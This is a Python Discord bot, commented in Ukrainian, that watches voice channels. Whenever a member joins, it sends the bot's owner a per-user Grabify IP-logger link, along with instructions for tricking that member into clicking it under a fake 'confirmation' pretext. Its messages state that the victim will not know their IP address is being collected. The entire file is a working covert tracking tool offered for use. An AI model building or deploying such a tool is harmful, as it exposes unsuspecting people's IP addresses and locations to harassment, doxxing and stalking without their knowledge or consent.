import discord
from discord.ext import commands
import os
import datetime

# ========================================
# 1. НАЛАШТУВАННЯ
# ========================================
TOKEN = os.getenv('DISCORD_TOKEN')
YOUR_USER_ID = int(os.getenv('YOUR_USER_ID', '0'))

# ТВОЄ ПОСИЛАННЯ З GRABIFY
GRABIFY_LINK = "https://grabify.link/AC6BBB"

# ========================================
# 2. КОД БОТА
# ========================================
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

# Словник для збереження посилань користувачів
user_links = {}

@bot.event
async def on_ready():
    print(f'✅ Бот {bot.user} запущено!')
    print(f'📊 Підключено до {len(bot.guilds)} серверів')
    print(f'🔗 Grabify посилання: {GRABIFY_LINK}')
    
    try:
        user = await bot.fetch_user(YOUR_USER_ID)
        await user.send(f"✅ Бот запущено!\n🔗 Посилання для збору IP: {GRABIFY_LINK}\n\n📌 Тепер я буду сповіщати тебе про нових учасників у голосових каналах.")
        print("📨 Тестове повідомлення відправлено!")
    except Exception as e:
        print(f"⚠️ Не вдалося відправити тестове повідомлення: {e}")

@bot.event
async def on_voice_state_update(member, before, after):
    """Слідкуємо за голосовими каналами"""
    
    # Коли хтось ПІДКЛЮЧИВСЯ до голосового каналу
    if before.channel is None and after.channel is not None:
        user_id = str(member.id)
        
        # Створюємо унікальне посилання з ID користувача
        tracking_link = f"{GRABIFY_LINK}?id={user_id}"
        user_links[user_id] = tracking_link
        
        try:
            # Відправляємо ТОБІ сповіщення
            user = await bot.fetch_user(YOUR_USER_ID)
            
            embed = discord.Embed(
                title="🔊 НОВИЙ УЧАСНИК У ГОЛОСОВОМУ КАНАЛІ!",
                description=f"**{member.name}** приєднався до каналу **{after.channel.name}**",
                color=discord.Color.gold(),
                timestamp=datetime.datetime.now()
            )
            embed.set_thumbnail(url=member.display_avatar.url)
            embed.add_field(name="👤 Ім'я", value=member.name, inline=True)
            embed.add_field(name="🆔 ID", value=member.id, inline=True)
            embed.add_field(name="🔊 Канал", value=after.channel.name, inline=True)
            embed.add_field(
                name="🔗 Щоб побачити IP", 
                value=f"Відправ це посилання **{member.name}**:",
                inline=False
            )
            embed.add_field(
                name="📋 Посилання", 
                value=f"```\n{tracking_link}\n```",
                inline=False
            )
            embed.add_field(
                name="📌 Інструкція", 
                value=(
                    "1️⃣ Скопіюй посилання вище\n"
                    "2️⃣ Відправ його користувачу в чат\n"
                    "3️⃣ Користувач натискає на посилання\n"
                    "4️⃣ Ти бачиш його IP на сайті Grabify!"
                ),
                inline=False
            )
            embed.set_footer(text="Користувач не знатиме, що ви збираєте IP")
            
            await user.send(embed=embed)
            print(f"📨 Відправлено сповіщення про {member.name}")
            
        except Exception as e:
            print(f"❌ Помилка при відправці: {e}")

@bot.command(name='ip')
async def get_ip(ctx, user: discord.Member = None):
    """Отримати посилання для користувача (тільки власник)"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника бота!")
        return
    
    if user is None:
        user = ctx.author
    
    user_id = str(user.id)
    if user_id in user_links:
        embed = discord.Embed(
            title="🔗 Посилання для користувача",
            description=f"**{user.name}**",
            color=discord.Color.blue()
        )
        embed.add_field(name="📋 Посилання", value=f"```\n{user_links[user_id]}\n```", inline=False)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="❌ Посилання не знайдено",
            description=f"Користувач **{user.name}** ще не заходив у голосовий канал",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command(name='link')
async def show_link(ctx):
    """Показати головне Grabify посилання (тільки власник)"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника бота!")
        return
    
    embed = discord.Embed(
        title="📊 Твоє Grabify посилання",
        description=f"Переходь за ним, щоб побачити зібрані IP!",
        color=discord.Color.green()
    )
    embed.add_field(name="🔗 Посилання", value=f"```\n{GRABIFY_LINK}\n```", inline=False)
    embed.add_field(name="📊 Статистика", value=f"Відстежується {len(user_links)} користувачів", inline=False)
    await ctx.send(embed=embed)

@bot.command(name='stats')
async def show_stats(ctx):
    """Показати статистику (тільки власник)"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника бота!")
        return
    
    embed = discord.Embed(
        title="📊 Статистика бота",
        color=discord.Color.blue()
    )
    embed.add_field(name="👥 Відстежується користувачів", value=len(user_links), inline=True)
    embed.add_field(name="🔗 Grabify посилання", value=GRABIFY_LINK, inline=False)
    await ctx.send(embed=embed)

@bot.command(name='help_ip')
async def help_ip(ctx):
    """Показати інструкцію (тільки власник)"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника бота!")
        return
    
    embed = discord.Embed(
        title="📖 Інструкція по роботі з ботом",
        description="Як отримати IP користувача?",
        color=discord.Color.purple()
    )
    embed.add_field(
        name="1️⃣ Користувач заходить у голосовий канал",
        value="Бот надсилає тобі сповіщення з посиланням",
        inline=False
    )
    embed.add_field(
        name="2️⃣ Ти відправляєш посилання користувачу",
        value="Просто встав посилання в чат і напиши: `@User, натисни для підтвердження`",
        inline=False
    )
    embed.add_field(
        name="3️⃣ Користувач натискає",
        value="Він бачить звичайну сторінку і не знає про збір IP",
        inline=False
    )
    embed.add_field(
        name="4️⃣ Ти дивишся IP",
        value="Зайди на grabify.link або використай команду `!ip @user`",
        inline=False
    )
    embed.add_field(
        name="📋 Команди",
        value=(
            "`!ip @user` - показати посилання для користувача\n"
            "`!link` - показати твоє Grabify посилання\n"
            "`!stats` - статистика\n"
            "`!help_ip` - ця інструкція"
        ),
        inline=False
    )
    await ctx.send(embed=embed)

# ========================================
# 3. ЗАПУСК БОТА
# ========================================
if __name__ == "__main__":
    if not TOKEN:
        print("❌ ПОМИЛКА: DISCORD_TOKEN не знайдено!")
        print("📌 Додай змінну DISCORD_TOKEN на Render")
        exit(1)
    
    if YOUR_USER_ID == 0:
        print("⚠️ ПОПЕРЕДЖЕННЯ: YOUR_USER_ID не налаштовано!")
    
    bot.run(TOKEN)
